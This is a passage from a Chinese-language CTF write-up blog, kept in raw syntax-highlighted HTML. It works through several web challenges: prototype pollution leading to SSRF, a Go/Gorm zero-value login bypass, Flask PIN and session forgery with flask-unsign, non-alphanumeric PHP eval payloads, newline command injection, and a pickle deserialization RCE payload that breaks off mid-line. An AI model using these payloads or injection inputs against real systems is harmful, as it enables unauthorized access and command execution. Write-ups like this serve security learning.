class="hljs-string">&quot;POST&quot;</span>) &#123;<br>        <span class="hljs-keyword">return</span> axios.<span class="hljs-title function_">post</span>(url, req.<span class="hljs-property">body</span>, &#123;<br>          <span class="hljs-attr">headers</span>: headers,<br>        &#125;);<br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (req.<span class="hljs-property">method</span> == <span class="hljs-string">&quot;GET&quot;</span>) &#123;<br>        <span class="hljs-keyword">return</span> axios.<span class="hljs-title function_">get</span>(url, &#123;<br>          <span class="hljs-attr">headers</span>: headers,<br>        &#125;);<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        res.<span class="hljs-title function_">status</span>(<span class="hljs-number">405</span>);<br>        res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;method not allowed.&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>      &#125;<br>    &#125;)();<br>    res.<span class="hljs-title function_">status</span>(remote_res.<span class="hljs-property">status</span>);<br>    res.<span class="hljs-title function_">header</span>(remote_res.<span class="hljs-property">headers</span>);<br>    res.<span class="hljs-title function_">write</span>(remote_res.<span class="hljs-property">data</span>);<br>  &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>    res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>);<br>    res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;unreachable url.&quot;</span>);<br>  &#125;<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/user/login&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; username, password &#125; = req.<span class="hljs-property">body</span>;<br>  <span class="hljs-keyword">if</span> (<br>    <span class="hljs-keyword">typeof</span> username != <span class="hljs-string">&quot;string&quot;</span> ||<br>    <span class="hljs-keyword">typeof</span> password != <span class="hljs-string">&quot;string&quot;</span> ||<br>    !username ||<br>    !password<br>  ) &#123;<br>    res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>);<br>    res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;invalid username or password&quot;</span>);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>  <span class="hljs-keyword">if</span> (!userStorage[username]) &#123;<br>    res.<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>);<br>    res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;invalid username or password&quot;</span>);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>  <span class="hljs-keyword">if</span> (userStorage[username].<span class="hljs-property">password</span> !== password) &#123;<br>    res.<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>);<br>    res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;invalid username or password&quot;</span>);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span> = username;<br>  res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;login success&quot;</span>);<br>&#125;);<br><br><span class="hljs-comment">// under development</span><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/user/info&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (!req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span>) &#123;<br>    res.<span class="hljs-title function_">sendStatus</span>(<span class="hljs-number">403</span>);<br>  &#125;<br>  <span class="hljs-title function_">update</span>(userStorage[req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span>].<span class="hljs-property">info</span>, req.<span class="hljs-property">body</span>);<br>  res.<span class="hljs-title function_">sendStatus</span>(<span class="hljs-number">200</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;/home&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (!req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span>) &#123;<br>    res.<span class="hljs-title function_">sendStatus</span>(<span class="hljs-number">403</span>);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&quot;home&quot;</span>, &#123;<br>    <span class="hljs-attr">username</span>: req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span>,<br>    <span class="hljs-attr">strategy</span>: (<span class="hljs-function">(<span class="hljs-params">list</span>)=&gt;</span>&#123;<br>      <span class="hljs-keyword">var</span> result = [];<br>      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> key <span class="hljs-keyword">in</span> list) &#123;<br>        result.<span class="hljs-title function_">push</span>(&#123;<span class="hljs-attr">host</span>: key, <span class="hljs-attr">allow</span>: list[key]&#125;);<br>      &#125;<br>      <span class="hljs-keyword">return</span> result;<br>    &#125;)(userStorage[req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span>].<span class="hljs-property">strategy</span>),<br>  &#125;);<br>&#125;);<br><br><span class="hljs-comment">// demo service behind webvpn</span><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (<br>    req.<span class="hljs-property">headers</span>.<span class="hljs-property">host</span> != <span class="hljs-string">&quot;127.0.0.1:3000&quot;</span> ||<br>    req.<span class="hljs-property">hostname</span> != <span class="hljs-string">&quot;127.0.0.1&quot;</span> ||<br>    req.<span class="hljs-property">ip</span> != <span class="hljs-string">&quot;127.0.0.1&quot;</span> <br>  ) &#123;<br>    res.<span class="hljs-title function_">sendStatus</span>(<span class="hljs-number">400</span>);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>  <span class="hljs-keyword">const</span> data = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&quot;/flag&quot;</span>);<br>  res.<span class="hljs-title function_">send</span>(data);<br>&#125;);<br><br>app.<span class="hljs-title function_">listen</span>(port, <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`app listen on <span class="hljs-subst">$&#123;port&#125;</span>`</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p>梳理一下主要部分，首先是类似于<code>merge</code>函数的<code>update</code>函数：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">update</span>(<span class="hljs-params">dst, src</span>) &#123;<br>  <span class="hljs-keyword">for</span> (key <span class="hljs-keyword">in</span> src) &#123;<br>    <span class="hljs-keyword">if</span> (key.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;__&quot;</span>) != -<span class="hljs-number">1</span>) &#123;<br>      <span class="hljs-keyword">continue</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> src[key] == <span class="hljs-string">&quot;object&quot;</span> &amp;&amp; dst[key] !== <span class="hljs-literal">undefined</span>) &#123;<br>      <span class="hljs-title function_">update</span>(dst[key], src[key]);<br>      <span class="hljs-keyword">continue</span>;<br>    &#125;<br>    dst[key] = src[key];<br>  &#125;<br>&#125;<br><span class="hljs-comment">//首先这里过滤了__。没过滤的话可以使用类似:&quot;__proto__&quot;:&#123;&quot;ctfshow&quot;:&quot;36dboy&quot;&#125;&#125;进行原型链污染，其实就算过滤了也能使用constructor.prototype</span><br><span class="hljs-comment">//另外限制了当前属性值必须为对象，且目标对象`dst`中存在同名属性</span><br></code></pre></td></tr></table></figure><p>接下来是调用了这个<code>update</code>函数的地方：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs js">app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/user/info&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (!req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span>) &#123;<br>    res.<span class="hljs-title function_">sendStatus</span>(<span class="hljs-number">403</span>);<br>  &#125;<br>  <span class="hljs-title function_">update</span>(userStorage[req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span>].<span class="hljs-property">info</span>, req.<span class="hljs-property">body</span>);<br>  res.<span class="hljs-title function_">sendStatus</span>(<span class="hljs-number">200</span>);<br>&#125;);<br><span class="hljs-comment">//update了info和请求体，userStorage如下：</span><br><span class="hljs-keyword">var</span> userStorage = &#123;<br>  <span class="hljs-attr">username</span>: &#123;<br>    <span class="hljs-attr">password</span>: <span class="hljs-string">&quot;password&quot;</span>,<br>    <span class="hljs-attr">info</span>: &#123;<br>      <span class="hljs-attr">age</span>: <span class="hljs-number">18</span>,<br>    &#125;,<br>    <span class="hljs-attr">strategy</span>: &#123;<br>      <span class="hljs-string">&quot;baidu.com&quot;</span>: <span class="hljs-literal">true</span>,<br>      <span class="hljs-string">&quot;google.com&quot;</span>: <span class="hljs-literal">false</span>,<br>    &#125;,<br>  &#125;,<br>&#125;;<br></code></pre></td></tr></table></figure><p>然后就是获得<code>flag</code>的路由，限制了本地才能访问。猜测是在原型链污染的基础上进行<code>SSRF</code>:</p><p>通过在<code>user/info</code>路由下进行原型链污染使得<code>127.0.0.1:3000</code>为<code>True</code>即可。当时看到<code>src[key] == &quot;object&quot; &amp;&amp; dst[key] !== undefined</code>这东西我还以为<code>constructor</code>这东西不能用了要再想别的办法。。🤦‍后面有师傅说直接这么写就行：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;constructor&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;prototype&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;127.0.0.1&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>唉，笨死了🤦‍</p><h2 id="HGAME-week3-Zero-Link-1"><a href="#HGAME-week3-Zero-Link-1" class="headerlink" title="[HGAME-week3]Zero Link"></a>[HGAME-week3]Zero Link</h2><p>一个存储记忆的网站，输入用户名或者<code>Token</code>可以查对应用户存了啥东西，比如：</p><p><img src="/img/zerolink1.png" alt="zerolink1"></p><p>放一些代码中比较重要的部分：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//Auth.go，只允许Admin登录</span><br><span class="hljs-keyword">if</span> req.Username != <span class="hljs-string">&quot;Admin&quot;</span> &#123;<br>c.JSON(http.StatusForbidden, AuthResponse&#123;<br>Code:    http.StatusForbidden,<br>Message: <span class="hljs-string">&quot;Only Admin is allowed to login&quot;</span>,<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">if</span> req.Password != password &#123;<br>c.JSON(http.StatusUnauthorized, AuthResponse&#123;<br>Code:    http.StatusUnauthorized,<br>Message: <span class="hljs-string">&quot;Invalid password&quot;</span>,<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br></code></pre></td></tr></table></figure><p>首先只允许以<code>Admin</code>身为用户名登录。不过密码是啥并没有说，不过存在：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//sqlite.go</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GetUserByUsernameOrToken</span><span class="hljs-params">(username <span class="hljs-type">string</span>, token <span class="hljs-type">string</span>)</span></span> (*User, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-keyword">var</span> user User<br>query := db<br><span class="hljs-keyword">if</span> username != <span class="hljs-string">&quot;&quot;</span> &#123;<br>query = query.Where(&amp;User&#123;Username: username&#125;)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>query = query.Where(&amp;User&#123;Token: token&#125;)<br>&#125;<br>err := query.First(&amp;user).Error<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Println(<span class="hljs-string">&quot;Cannot get user: &quot;</span> + err.Error())<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">return</span> &amp;user, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Go</code>语言的零值问题：<a href="https://youwu.today/skill/backend/golang-zero-value-and-reference-and-null-value-testing/">参考资料</a></p><p>如果传进去的是个空字符串，因为User的Username属性本身就是字符串类型的，Gorm内部将无法分辨User的username属性是否被赋值过，这导致Gorm在生成SQL语句时不会为该属性生成条件语句:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> `<span class="hljs-keyword">user</span>` LIMIT <span class="hljs-number">1</span>   <span class="hljs-operator">/</span><span class="hljs-operator">/</span>这里查了表中第一个用户，一般第一个用户就是Admin<br></code></pre></td></tr></table></figure><p><code>/api/user</code>接口抓包，把<code>username</code>和<code>token</code>字段都置空:</p><p><img src="/img/zerolink3.png" alt="zerolink3"></p><p>然后登录，发现存在上传功能：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//file.go，这里实现了上传和解压功能</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">UploadFile</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>file, err := c.FormFile(<span class="hljs-string">&quot;file&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusBadRequest, FileResponse&#123;<br>Code:    http.StatusBadRequest,<br>Message: <span class="hljs-string">&quot;No file uploaded&quot;</span>,<br>Data:    <span class="hljs-string">&quot;&quot;</span>,<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>ext := filepath.Ext(file.Filename)<br><span class="hljs-keyword">if</span> (ext != <span class="hljs-string">&quot;.zip&quot;</span>) || (file.Header.Get(<span class="hljs-string">&quot;Content-Type&quot;</span>) != <span class="hljs-string">&quot;application/zip&quot;</span>) &#123;<br>c.JSON(http.StatusBadRequest, FileResponse&#123;<br>Code:    http.StatusBadRequest,<br>Message: <span class="hljs-string">&quot;Only .zip files are allowed&quot;</span>,<br>Data:    <span class="hljs-string">&quot;&quot;</span>,<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">UnzipPackage</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>files, err := filepath.Glob(<span class="hljs-string">&quot;/app/uploads/*.zip&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusInternalServerError, FileResponse&#123;<br>Code:    http.StatusInternalServerError,<br>Message: <span class="hljs-string">&quot;Failed to get list of .zip files&quot;</span>,<br>Data:    <span class="hljs-string">&quot;&quot;</span>,<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-keyword">for</span> _, file := <span class="hljs-keyword">range</span> files &#123;<br>cmd := exec.Command(<span class="hljs-string">&quot;unzip&quot;</span>, <span class="hljs-string">&quot;-o&quot;</span>, file, <span class="hljs-string">&quot;-d&quot;</span>, <span class="hljs-string">&quot;/tmp/&quot;</span>)<br><span class="hljs-keyword">if</span> err := cmd.Run(); err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusInternalServerError, FileResponse&#123;<br>Code:    http.StatusInternalServerError,<br>Message: <span class="hljs-string">&quot;Failed to unzip file: &quot;</span> + file,<br>Data:    <span class="hljs-string">&quot;&quot;</span>,<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br><span class="hljs-comment">//登录后的/api/secret路由下存在读取文件的功能：</span><br>    <span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ReadSecretFile</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>secretFilepath := <span class="hljs-string">&quot;/app/secret&quot;</span><br>content, err := util.ReadFileToString(secretFilepath)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusInternalServerError, FileResponse&#123;<br>Code:    http.StatusInternalServerError,<br>Message: <span class="hljs-string">&quot;Failed to read secret file&quot;</span>,<br>Data:    <span class="hljs-string">&quot;&quot;</span>,<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>secretContent, err := util.ReadFileToString(content)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusInternalServerError, FileResponse&#123;<br>Code:    http.StatusInternalServerError,<br>Message: <span class="hljs-string">&quot;Failed to read secret file content&quot;</span>,<br>Data:    <span class="hljs-string">&quot;&quot;</span>,<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br></code></pre></td></tr></table></figure><p>只检查了文件的<code>content-type</code>和最后一个<code>.</code>后是否为<code>zip</code>。然后会把这个文件解压到<code>/tmp</code>目录下。后面应该是利用软链接和<code>secret</code>路由解题，但是不太会做😵</p><h2 id="web801"><a href="#web801" class="headerlink" title="web801"></a>web801</h2><p><code>flask</code>算<code>Pin</code>，单纯考这个东西的还是挺少。之前做过把<code>SSTI</code>或<code>XXE</code>和这东西拼到一起的题(其实主要就是利用某些方式去读算PIN需要的文件，算完了就能执行命令啥的)。</p><p><a href="https://xz.aliyun.com/t/8092#toc-2">参考资料</a></p><p><code>/file?filenname=</code>可以进行任意文件读取，然后照着文章里需要的文件读完跑个脚本就行(新旧版本不同，版本根据报错能出)。</p><h2 id="web802"><a href="#web802" class="headerlink" title="web802"></a>web802</h2><p>无字母数字命令执行。<a href="https://xz.aliyun.com/t/8107?time__1311=n4+xuDgDBDyGD=DOFD/D0ioQLR7xcQrD7w2vD&alichlgref=https://www.google.com/">参考资料</a></p><p><a href="https://blog.csdn.net/miuzzx/article/details/109143413">参考资料</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-z]|[0-9]/i&#x27;</span>,<span class="hljs-variable">$cmd</span>))&#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$cmd</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>主要就三种方法：异或、取反和自增。</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mel">cmd=$_=(_/_._)[_];$_%2b%2b;$%FA=$_.$_%2b%2b;$_%2b%2b;$_%2b%2b;$_=_.$%FA.%2b%2b$_.%2b%2b$_;$$_[_]($$_[%FA]);&amp;_=<span class="hljs-keyword">system</span>&amp;%FA=cat f*<br>或者：<br>(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%93%9E%98%D5);<br></code></pre></td></tr></table></figure><h2 id="HGAME-What-the-cow-say"><a href="#HGAME-What-the-cow-say" class="headerlink" title="[HGAME]What the cow say?"></a>[HGAME]What the cow say?</h2><p>页面功能就是输入啥这个牛就会说啥：</p><p><img src="/img/cowsaywhat1.png" alt="cowsaywhat1"></p><p>单独一个<code>&#39;</code>会报错，<code>&#39;&#39;</code>直接被替换成空。<code>;</code>，<code>&amp;</code>，<code>|</code>直接触发waf。</p><p>多命令执行的话也可以用<code>%0a</code>:</p><p><code>%0als /</code>:</p><p><img src="/img/cowsaywhat3.png" alt="cowsaywhat3"></p><p>他底下还有个<code>flag_c0w54y</code>文件，然后过滤了<code>flag</code>关键字用<code>fla?</code>替换，过滤了<code>cat</code>用<code>more</code>替换：</p><p><code>%0amore /fla?_is_here/fla?_c0w54y</code></p><p><img src="/img/cowsaywhat4.png" alt="cowsaywhat4"></p><h2 id="HGAME-myflask"><a href="#HGAME-myflask" class="headerlink" title="[HGAME]myflask"></a>[HGAME]myflask</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, session, request, send_file<br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">from</span> pytz <span class="hljs-keyword">import</span> timezone<br><br>currentDateAndTime = datetime.now(timezone(<span class="hljs-string">&#x27;Asia/Shanghai&#x27;</span>))<br>currentTime = currentDateAndTime.strftime(<span class="hljs-string">&quot;%H%M%S&quot;</span>)<br><br>app = Flask(__name__)<br><span class="hljs-comment"># Tips: Try to crack this first ↓</span><br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = currentTime<br><span class="hljs-built_in">print</span>(currentTime)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    session[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span><br>    <span class="hljs-keyword">return</span> send_file(<span class="hljs-string">&#x27;app.py&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/flag&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">flag</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> session:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;There is no session available in your client :(&#x27;</span><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;GET&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;You are &#123;&#125; now&#x27;</span>.<span class="hljs-built_in">format</span>(session[<span class="hljs-string">&#x27;username&#x27;</span>])<br>    <br>    <span class="hljs-comment"># For POST requests from admin</span><br>    <span class="hljs-keyword">if</span> session[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-string">&#x27;admin&#x27;</span>:<br>        pickle_data=base64.b64decode(request.form.get(<span class="hljs-string">&#x27;pickle_data&#x27;</span>))<br>        <span class="hljs-comment"># Tips: Here try to trigger RCE</span><br>        userdata=pickle.loads(pickle_data)<br>        <span class="hljs-keyword">return</span> userdata<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Access Denied&#x27;</span><br> <br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>, host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>)<br></code></pre></td></tr></table></figure><p><code>session</code>伪造+<code>pickle</code>反序列化</p><p>抓包看<code>session</code>，先把这个<code>secret_key</code>破解：</p><p>这个东西其实就是用六位数表示<code>小时分钟秒数</code>，直接爆破就行。</p><p>然后就是<code>session</code>伪造：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">flask-unsign --unsign --cookie <span class="hljs-string">&#x27;session的值&#x27;</span> --wordlist /home/viper3/桌面/output.txt --no-literal-eval<br>//结果：b<span class="hljs-string">&#x27;102921&#x27;</span><br>flask-unsign --sign --cookie <span class="hljs-string">&quot;&#123;&#x27;username&#x27;: &#x27;admin&#x27;&#125;&quot;</span> --secret <span class="hljs-string">&#x27;102921&#x27;</span> --no-literal-eval<br></code></pre></td></tr></table></figure><p>可以验证一下：</p><p><img src="/img/myflaskhgame.png" alt="myflaskhgame"></p><p>成功以admin身份登录，接下来就是RCE了：</p><p>需要注意的点就是python版本要用3，然后windows和linux下生成的payload是不同的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        s = <span class="hljs-string">&quot;&quot;&quot;python -c &#x27;import 